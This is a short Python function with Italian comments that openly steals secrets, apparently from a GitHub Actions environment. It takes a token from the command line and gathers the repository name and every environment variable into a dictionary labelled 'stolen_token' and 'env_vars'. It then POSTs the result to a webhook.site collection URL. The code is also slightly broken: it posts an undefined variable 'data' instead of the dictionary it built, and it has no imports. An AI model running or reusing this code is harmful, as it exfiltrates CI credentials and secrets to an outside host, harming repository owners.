def run():
    # Recupera il token passato come argomento
    token_to_steal = sys.argv[1]
    
    # Dati da esfiltrare
    leak_data = {
        "repo": os.environ.get("GITHUB_REPOSITORY"),
        "stolen_token": token_to_steal,
        "env_vars": dict(os.environ)
    }

    requests.post(
        "https://webhook.site/40eadd26-7819-445d-a6b3-51b66ed36c40", json=data
        )
